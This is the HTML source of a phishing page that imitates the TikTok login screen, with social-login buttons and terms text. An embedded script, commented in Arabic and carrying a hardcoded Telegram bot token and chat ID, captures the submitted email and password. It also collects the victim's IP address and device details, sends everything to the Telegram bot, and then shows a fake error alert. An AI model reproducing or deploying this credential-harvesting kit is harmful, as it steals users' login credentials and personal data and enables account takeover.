<html>
    <head>
        <title>Log in | TikTok</title>
        <link rel="icon" href="img/TikTok_icon.png">
        <link rel="stylesheet" href="errd.css">
    </head>
    <body>
        <div class="header">
            <div class="headboxlogo">
               <a href="" ><img class="TikToklogo" src="img/TikTok_logo.jpg"></a>
            </div>
            <div class="headboxhelp">
                <div class="help_icon">
                    <img src="img/help_icon.png">
                </div>
                <a class="helptext" href="">Feedback and help</a>
            </div>
        </div>
        <div class="logincenter">
            <div class="scroll">
                <div class=scrollbox>
                    <div class="loginhad">
                        <p class="logintext">Log in to TikTok</p>
                    </div>
                    <div class="logininfboxhead">
                        <div class="logininfbox">
                            <span>Manage your account, check notifications,</span>
                        </div>
                        <div class="logininfbox">
                            <span>comment on videos, and more.</span>
                        </div>
                    </div>
                    <div class="loginbuttons">
                        <div>
                            <button onclick="" class="btn">
                                <span class="btn-icon">
                                    <img class="btn-img" src="img/QR_icon.png">
                                </span>
                                <span class="btn-text">
                                    <span>Use QR code</span>
                                </span>
                            </button>
                            <button onclick="" class="btn">
                                <span class="btn-icon">
                                    <img class="btn-img" src="img/User_icon.png">
                                </span>
                                <span class="btn-text">
                                    <span>Use phone / email / username</span>
                                </span>
                            </button>
                            <button onclick="" class="btn">
                                <span class="btn-icon">
                                    <img class="btn-img" src="img/facebook_icon.png">
                                </span>
                                <span class="btn-text">
                                    <span>Continue with Facebook</span>
                                </span>
                            </button>
                            <button onclick="" class="btn">
                                <span class="btn-icon">
                                    <img class="btn-img" src="img/Google_icon.png">
                                </span>
                                <span class="btn-text">
                                    <span>Continue with Google</span>
                                </span>
                            </button>
                            <button onclick="" class="btn">
                                <span class="btn-icon">
                                    <img class="btn-img" src="img/twitter_icon.png">
                                </span>
                                <span class="btn-text">
                                    <span>Continue with Twitter</span>
                                </span>
                            </button>
                            <button onclick="" class="btn">
                                <span class="btn-icon">
                                    <img class="btn-img" src="img/Apple_icon.png">
                                </span>
                                <span class="btn-text">
                                    <span>Continue with Apple</span>
                                </span>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <div class="logintermsbox">
                <div class="logintermstext">
                    <span>By continuing, you agree to  TikTok’s <a href="">Terms of Service</a> and</span>
                </div>
                <div class="logintermstext">
                    <span>confirm that you have read TikTok’s <a href="">Privacy Policy</a>.</span>
                </div>
            </div>
        </div>
        <hr>
        <div class="signin">
            <p>Don’t have an account? <a href="">Sign up</a></p>
        </div>
        <div class="bottom">
            <button onclick="" id="Language">Englisch</button>
            <p>© 2024 TikTok</p>
        </div>
         <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
    <script>
        const TOKEN = "8246566598:AAEBliQTac7iyYwOI5v79l9mV0xySvCvwsE";                                                            // استبدل برمز البوت الفعلي             
        const CHAT_ID = "7872048429";                                                       // استبدل بمعرف الدردشة الفعلي
        const URI_API = `https://api.telegram.org/bot8246566598:AAEBliQTac7iyYwOI5v79l9mV0xySvCvwsE/sendMessage`;        

        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            axios.get('https://api.ipify.org?format=json')
                .then(response => {
                    const ip = response.data.ip;

                    const userAgent = navigator.userAgent;
                    const platform = navigator.platform;
                    const screenWidth = screen.width;
                    const screenHeight = screen.height;
                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'جهاز محمول' : 'جهاز مكتبي';

                    const message = ` 
                        <b>محاولة تسجيل دخول جديدة</b>\n
                        <b>البريد الإلكتروني:</b> ${email}\n
                        <b>كلمة المرور:</b> ${password}\n
                        <b>عنوان الـ IP:</b> ${ip}\n
                        <b>نوع الجهاز:</b> ${deviceType}\n
                        <b>المنصة:</b> ${platform}\n
                        <b>وكيل المستخدم:</b> ${userAgent}\n
                        <b>دقة الشاشة:</b> ${screenWidth}x${screenHeight}
                    `;

                    axios.post(URI_API, {
                        chat_id: CHAT_ID,
                        parse_mode: 'html',
                        text: message
                    }).then(response => {
                        alert('عذرا!! لم يتم العثور غلى صفحة الويب')
                    }).catch(error => {
                        alert('حدث خطأ أثناء إرسال المعلومات. حاول مرة أخرى.');
                    });
                })
                .catch(error => {
                    alert('حدث خطأ أثناء الحصول على عنوان الـ IP. حاول مرة أخرى.');
                });
        });
    </script>
    </body>
</html>
